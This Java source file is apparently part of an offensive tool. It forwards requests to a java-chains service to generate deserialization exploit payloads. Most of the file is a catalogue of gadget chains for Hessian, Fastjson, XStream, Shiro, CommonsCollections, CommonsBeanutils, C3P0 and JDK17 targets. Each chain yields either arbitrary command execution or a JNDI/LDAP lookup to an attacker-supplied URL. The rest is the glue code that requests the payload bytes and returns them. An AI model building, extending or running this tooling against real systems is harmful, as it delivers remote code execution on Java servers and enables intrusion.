package com.oobx.chains;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Base64;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.logging.Logger;

/**
 * Proxies payload generation to a running java-chains instance.
 *
 * java-chains (https://github.com/ar3h/java-chains) is a Spring Boot
 * service exposing a rich gadget library via a single REST endpoint:
 *   POST /parse  → {payloadName, gadgetList[], params{}, encode, type="Generate"}
 *
 * Config (application.properties or env vars):
 *   javachains.url       (default http://127.0.0.1:8011)
 *   javachains.auth      (default false — start java-chains with CHAINS_AUTH=false)
 *   javachains.username  (default admin)
 *   javachains.password  (default empty)
 *
 * Chain encoding quirk: java-chains returns
 *   encode="base64" → data.payload is base64-encoded binary
 *   encode="disable" → data.payload is raw text (JSON, XML, cookie)
 */
@Component
public class JavaChainsProxyHandler implements ChainHandler {

    private static final Logger log = Logger.getLogger(JavaChainsProxyHandler.class.getName());

    @Value("${javachains.url:http://127.0.0.1:8011}")
    private String baseUrl;

    @Value("${javachains.auth:false}")
    private boolean authEnabled;

    @Value("${javachains.username:admin}")
    private String username;

    @Value("${javachains.password:}")
    private String password;

    // ── Chain descriptor ──────────────────────────────────────────────────────

    record ChainDef(
        String payloadName,
        List<String> gadgets,
        boolean jndiMode,          // true → map jndi_url→jndiUrl; false → map cmd→command
        String outContentType      // used when encode="disable" (text payloads)
    ) {}

    // ── OOBserver chain ID → java-chains chain config ─────────────────────────
    private static final Map<String, ChainDef> CHAIN_MAP;
    static {
        Map<String, ChainDef> m = new HashMap<>();

        // ── Hessian1 ──────────────────────────────────────────────────────────

        // Spring JNDI1 (PartiallyComparableAdvisorHolder)
        m.put("jchains_hessian1_spring",
            new ChainDef("HessianPayload",
                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
                true, "application/octet-stream"));

        // exec: JDK native XSLT (no Spring deps on target)
        m.put("jchains_hessian1_exec",
            new ChainDef("HessianPayload",
                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Spring JNDI2 (AbstractBeanFactoryPointcutAdvisor)
        m.put("jchains_hessian1_spring2",
            new ChainDef("HessianPayload",
                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                true, "application/octet-stream"));

        // Spring direct exec
        m.put("jchains_hessian1_spring_exec",
            new ChainDef("HessianPayload",
                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringExec"),
                false, "application/octet-stream"));

        // Secondary deserialization via SwingLazyValue + Spring CB1
        m.put("jchains_hessian1_secondary",
            new ChainDef("HessianPayload",
                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
                        "JavaNativeSerialization", "CommonsBeanutils1",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // JDK native BCEL (ProxyLazyValue)
        m.put("jchains_hessian1_bcel",
            new ChainDef("HessianPayload",
                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
                        "BcelConvert", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Rome1 secondary deserialization
        m.put("jchains_hessian1_rome1",
            new ChainDef("HessianPayload",
                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Rome2 secondary deserialization
        m.put("jchains_hessian1_rome2",
            new ChainDef("HessianPayload",
                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── Hessian2 ──────────────────────────────────────────────────────────

        // Spring JNDI1
        m.put("jchains_hessian2_spring",
            new ChainDef("Hessian2Payload",
                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
                true, "application/octet-stream"));

        // exec: JDK native XSLT
        m.put("jchains_hessian2_exec",
            new ChainDef("Hessian2Payload",
                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Spring JNDI2
        m.put("jchains_hessian2_spring2",
            new ChainDef("Hessian2Payload",
                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringJndi1"),
                true, "application/octet-stream"));

        // Spring direct exec
        m.put("jchains_hessian2_spring_exec",
            new ChainDef("Hessian2Payload",
                List.of("SpringAbstractBeanFactoryPointcutAdvisor", "SpringExec"),
                false, "application/octet-stream"));

        // Secondary deserialization
        m.put("jchains_hessian2_secondary",
            new ChainDef("Hessian2Payload",
                List.of("SwingLazyValueUIDefaults", "LazyValueWithDS",
                        "JavaNativeSerialization", "CommonsBeanutils1",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // BCEL
        m.put("jchains_hessian2_bcel",
            new ChainDef("Hessian2Payload",
                List.of("ProxyLazyValueUIDefaults", "LazyValueWithBcel",
                        "BcelConvert", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Rome1 secondary
        m.put("jchains_hessian2_rome1",
            new ChainDef("Hessian2Payload",
                List.of("Rome1", "SignedObject", "JavaNativeSerialization",
                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Rome2 secondary
        m.put("jchains_hessian2_rome2",
            new ChainDef("Hessian2Payload",
                List.of("Rome2", "SignedObject", "JavaNativeSerialization",
                        "CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── Hessian2ToString ──────────────────────────────────────────────────

        // XBean toString → Tomcat EL
        m.put("jchains_hessian2_tostring_xbean",
            new ChainDef("Hessian2ToStringPayload",
                List.of("XBeanToString", "TomcatElRef", "ElConvert", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // Jackson toString secondary deserialization
        m.put("jchains_hessian2_tostring_jackson",
            new ChainDef("Hessian2ToStringPayload",
                List.of("JacksonToString", "SignedObject", "JavaNativeSerialization",
                        "Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── Fastjson ──────────────────────────────────────────────────────────

        // JdbcRowSetImpl JNDI (≤1.2.47)
        m.put("jchains_fastjson",
            new ChainDef("FastjsonPayload",
                List.of("FastjsonJdbcRowSetImpl"),
                true, "application/json"));
        m.put("jchains_fastjson_jndi",
            new ChainDef("FastjsonPayload",
                List.of("FastjsonJdbcRowSetImpl"),
                true, "application/json"));

        // BCEL (≤1.2.24)
        m.put("jchains_fastjson_bcel",
            new ChainDef("FastjsonPayload",
                List.of("FastjsonBasicDataSource", "BcelConvert", "BytecodeConvert", "Exec"),
                false, "application/json"));

        // C3P0 H2 JDBC (≤1.2.47)
        m.put("jchains_fastjson_c3p0_h2",
            new ChainDef("FastjsonPayload",
                List.of("FastjsonC3p0", "H2JavaJdbc1", "BytecodeConvert", "Exec"),
                false, "application/json"));

        // ── XStream ───────────────────────────────────────────────────────────

        // Spring JNDI
        m.put("jchains_xstream",
            new ChainDef("XStreamPayload",
                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
                true, "application/xml"));
        m.put("jchains_xstream_jndi",
            new ChainDef("XStreamPayload",
                List.of("SpringPartiallyComparableAdvisorHolder", "SpringJndi1"),
                true, "application/xml"));

        // JDK native exec
        m.put("jchains_xstream_exec",
            new ChainDef("XStreamPayload",
                List.of("XsltOnlyJdk", "JsConvert", "BytecodeConvert", "Exec"),
                false, "application/xml"));

        // ── Shiro ─────────────────────────────────────────────────────────────

        // CB1 AES-CBC cookie
        m.put("jchains_shiro_cbc",
            new ChainDef("ShiroPayload",
                List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // ── JavaNative: CommonsCollections ────────────────────────────────────

        m.put("jchains_cc1",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_cc2",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK2", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_cc3",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK3", "TransformerWithTemplatesImpl",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_cc4",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK4", "TransformerWithTemplatesImpl",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_cc6",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_native_cc6",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── JavaNative: CommonsBeanutils ──────────────────────────────────────

        // CB1
        m.put("jchains_cb1",
            new ChainDef("JavaNativePayload",
                List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));
        m.put("jchains_native_cb1",
            new ChainDef("JavaNativePayload",
                List.of("CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // CB2 (BeanUtils 1.8.x)
        m.put("jchains_native_cb2",
            new ChainDef("JavaNativePayload",
                List.of("CommonsBeanutils2", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // CB1 JNDI
        m.put("jchains_native_cb1_jndi",
            new ChainDef("JavaNativePayload",
                List.of("CommonsBeanutils1", "JdbcRowSetImpl"),
                true, "application/octet-stream"));

        // ── JavaNative: Jackson ───────────────────────────────────────────────

        m.put("jchains_native_jackson",
            new ChainDef("JavaNativePayload",
                List.of("Jackson", "TWrap", "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── JavaNative: JDK17 high-version chains ─────────────────────────────

        // JDK17 RCE chain 1 (EventListenerList)
        m.put("jchains_native_jdk17_1",
            new ChainDef("JavaNativePayload",
                List.of("EventListenerListToStringHighJDK", "JacksonToString",
                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // JDK17 RCE chain 2 (TextAndMnemonicHashMap)
        m.put("jchains_native_jdk17_2",
            new ChainDef("JavaNativePayload",
                List.of("TextAndMnemonicHashMapToStringHighJDK", "JacksonToString",
                        "TWrapHighVersion", "TemplatesImpl2", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── JavaNative: C3P0 ──────────────────────────────────────────────────

        // C3P0 LDAP remote class loader
        m.put("jchains_native_c3p0_ldap",
            new ChainDef("JavaNativePayload",
                List.of("MchangeC3p0Reference", "LdapClassLoader"),
                true, "application/octet-stream"));

        // C3P0 Tomcat EL exec
        m.put("jchains_native_c3p0_el",
            new ChainDef("JavaNativePayload",
                List.of("MchangeC3p0Reference", "TomcatElRef", "ElConvert",
                        "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── JavaNative: K1 secondary deserialization ──────────────────────────

        m.put("jchains_native_k1_secondary",
            new ChainDef("JavaNativePayload",
                List.of("CommonsCollectionsK1", "SignedObject", "JavaNativeSerialization",
                        "CommonsCollectionsK3", "TransformerWithTemplatesImpl",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        // ── JNDI Resource Ref payloads (text responses) ───────────────────────

        // Tomcat EL
        m.put("jchains_jndi_tomcat_el",
            new ChainDef("JNDIResourceRefPayload",
                List.of("TomcatElRef", "ElConvert", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // Groovy
        m.put("jchains_jndi_groovy",
            new ChainDef("JNDIResourceRefPayload",
                List.of("GroovyShellRef", "GroovyConvert", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // SnakeYAML SPI
        m.put("jchains_jndi_snakeyaml",
            new ChainDef("JNDIResourceRefPayload",
                List.of("SnakeyamlRef", "SnakeyamlJarSpi4JNDI",
                        "SnakeyamlJarConvert", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // Beanshell
        m.put("jchains_jndi_beanshell",
            new ChainDef("JNDIResourceRefPayload",
                List.of("BeanshellRef", "BeanshellConvert", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // ── H2 JDBC RCE (text/plain JDBC URL with embedded bytecode) ─────────

        m.put("jchains_h2_jdbc",
            new ChainDef("OtherPayload",
                List.of("H2JavaJdbc1", "BytecodeConvert", "Exec"),
                false, "text/plain"));

        // ── BlazeDSAMF3AM — Axis2 gadget ─────────────────────────────────────

        m.put("jchains_blazeds_axis2",
            new ChainDef("BlazeDSAMF3AMPayload",
                List.of("Axis2MetaDataEntry", "CommonsBeanutils1",
                        "TemplatesImpl", "BytecodeConvert", "Exec"),
                false, "application/octet-stream"));

        CHAIN_MAP = Collections.unmodifiableMap(m);
    }

    /** All chain IDs handled by this proxy (for ChainRegistry auto-registration). */
    public java.util.Set<String> chainIds() { return CHAIN_MAP.keySet(); }

    private final HttpClient http = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(10))
        .followRedirects(HttpClient.Redirect.NORMAL)
        .build();

    private volatile String sessionCookie = null;
    private final Object loginLock = new Object();

    // ── ChainHandler ──────────────────────────────────────────────────────────

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        ChainDef def = CHAIN_MAP.get(chainId.toLowerCase());
        if (def == null) {
            return new PayloadResult("application/octet-stream", new byte[0],
                Map.of("error", "Unknown chain for java-chains proxy: " + chainId,
                       "known", CHAIN_MAP.keySet()));
        }

        String cmd     = (String) params.getOrDefault("cmd", "");
        String jndiUrl = (String) params.getOrDefault("jndi_url", "");

        // Build java-chains params (key names match java-chains gadget param fields)
        Map<String, String> jcParams;
        if (def.jndiMode()) {
            if (jndiUrl.isEmpty()) {
                return new PayloadResult("application/octet-stream", new byte[0],
                    Map.of("error", "jndi_url required for JNDI chain: " + chainId));
            }
            jcParams = Map.of("jndiUrl", jndiUrl);
        } else {
            if (cmd.isEmpty()) {
                return new PayloadResult("application/octet-stream", new byte[0],
                    Map.of("error", "cmd required for exec chain: " + chainId));
            }
            jcParams = Map.of("command", cmd);
        }

        byte[] bytes = callParse(def, jcParams);

        if (bytes.length == 0) {
            return new PayloadResult("application/octet-stream", new byte[0],
                Map.of("error", "java-chains returned empty payload",
                       "chain", chainId, "payloadName", def.payloadName(),
                       "hint", "Ensure java-chains is running at " + baseUrl
                             + " with CHAINS_AUTH=false"));
        }

        return new PayloadResult(def.outContentType(), bytes,
            Map.of("chain", chainId, "payloadName", def.payloadName(),
                   "gadgets", def.gadgets(), "size", bytes.length,
                   "source", "java-chains@" + baseUrl));
    }

    // ── /parse API call ───────────────────────────────────────────────────────

    private byte[] callParse(ChainDef def, Map<String, String> jcParams) throws Exception {
        String body = buildParseBody(def, jcParams);
        String cookie = ensureSession();

        HttpRequest.Builder req = HttpRequest.newBuilder()
            .uri(URI.create(baseUrl + "/parse"))
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(body))
            .timeout(Duration.ofSeconds(30));
        if (cookie != null) req.header("Cookie", cookie);

        HttpResponse<String> resp = http.send(req.build(), HttpResponse.BodyHandlers.ofString());

        if (resp.statusCode() == 401 || resp.statusCode() == 403) {
            synchronized (loginLock) { sessionCookie = null; }
            cookie = ensureSession();
            HttpRequest.Builder retry = HttpRequest.newBuilder()
                .uri(URI.create(baseUrl + "/parse"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .timeout(Duration.ofSeconds(30));
            if (cookie != null) retry.header("Cookie", cookie);
            resp = http.send(retry.build(), HttpResponse.BodyHandlers.ofString());
        }

        if (resp.statusCode() != 200) {
            log.warning("java-chains /parse HTTP " + resp.statusCode() + ": "
                + resp.body().substring(0, Math.min(200, resp.body().length())));
            return new byte[0];
        }

        return extractPayload(resp.body());
    }

    // ── Request body builder ─────────────────────────────────────────────────

    private String buildParseBody(ChainDef def, Map<String, String> jcParams) {
        // Build gadgetList JSON array
        StringBuilder gadgets = new StringBuilder("[");
        for (int i = 0; i < def.gadgets().size(); i++) {
            if (i > 0) gadgets.append(",");
            gadgets.append('"').append(jsonEsc(def.gadgets().get(i))).append('"');
        }
        gadgets.append("]");

        // Build params object
        StringBuilder paramsJson = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> e : jcParams.entrySet()) {
            if (!first) paramsJson.append(",");
            paramsJson.append('"').append(jsonEsc(e.getKey())).append('"')
                      .append(":\"").append(jsonEsc(e.getValue())).append('"');
            first = false;
        }
        paramsJson.append("}");

        return String.format(
            "{\"payloadName\":\"%s\",\"gadgetList\":%s,\"params\":%s," +
            "\"encode\":\"base64\",\"urlEncoding\":false,\"type\":\"Generate\"," +
            "\"downloadMode\":false,\"saveFileMode\":false,\"saveFileName\":\"\"}",
            jsonEsc(def.payloadName()), gadgets, paramsJson);
    }

    // ── Response parser ───────────────────────────────────────────────────────

    private byte[] extractPayload(String responseBody) {
        // Expected: {"status":true,"data":{"encode":"base64"|"disable","payload":"...",...}}
        try {
            // Quick JSON parse without a full JSON library
            if (!responseBody.contains("\"status\":true")) {
                String msg = extractJsonString(responseBody, "message");
                log.warning("java-chains error: " + msg);
                return new byte[0];
            }

            String encode  = extractJsonString(responseBody, "encode");
            String payload = extractJsonString(responseBody, "payload");

            if (payload == null || payload.isEmpty()) {
                log.warning("java-chains: empty payload in response");
                return new byte[0];
            }

            if ("base64".equals(encode)) {
                // Binary payload (Java serialized, Hessian binary)
                return Base64.getDecoder().decode(payload);
            } else {
                // Text payload (JSON, XML, cookie string) — return as UTF-8 bytes
                return payload.getBytes(StandardCharsets.UTF_8);
            }
        } catch (Exception e) {
            log.warning("java-chains: failed to parse response: " + e + " body=" +
                responseBody.substring(0, Math.min(200, responseBody.length())));
            return new byte[0];
        }
    }

    /**
     * Minimal JSON string extractor — finds "key":"value" in flat JSON.
     * Works for the java-chains response format without a full JSON library.
     */
    private static String extractJsonString(String json, String key) {
        String needle = "\"" + key + "\":\"";
        int start = json.indexOf(needle);
        if (start < 0) return null;
        start += needle.length();
        // Find closing quote, respecting escape sequences
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < json.length(); i++) {
            char c = json.charAt(i);
            if (c == '\\' && i + 1 < json.length()) {
                char next = json.charAt(i + 1);
                switch (next) {
                    case '"'  -> sb.append('"');
                    case '\\' -> sb.append('\\');
                    case 'n'  -> sb.append('\n');
                    case 'r'  -> sb.append('\r');
                    case 't'  -> sb.append('\t');
                    default   -> sb.append(next);
                }
                i++; // skip escaped char
                continue;
            }
            if (c == '"') break;
            sb.append(c);
        }
        return sb.toString();
    }

    // ── Auth / session ────────────────────────────────────────────────────────

    private String ensureSession() throws Exception {
        if (!authEnabled) return null;
        if (sessionCookie != null) return sessionCookie;
        synchronized (loginLock) {
            if (sessionCookie != null) return sessionCookie;
            sessionCookie = login();
            return sessionCookie;
        }
    }

    private String login() throws Exception {
        // java-chains login: POST /auth/login with JSON body (NOT form-encoded)
        String body = "{\"username\":\"" + jsonEsc(username) + "\",\"password\":\"" + jsonEsc(password) + "\"}";
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create(baseUrl + "/auth/login"))
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(body))
            .timeout(Duration.ofSeconds(10))
            .build();

        HttpResponse<String> resp = http.send(req, HttpResponse.BodyHandlers.ofString());
        Optional<String> setCookie = resp.headers().firstValue("Set-Cookie");
        if (setCookie.isPresent() && resp.body().contains("\"success\":true")) {
            String cookie = setCookie.get().split(";")[0]; // "JSESSIONID=xxx"
            log.info("java-chains: logged in");
            return cookie;
        }
        log.warning("java-chains: login failed HTTP " + resp.statusCode() + ": " + resp.body());
        return null;
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    private static String jsonEsc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r");
    }
}
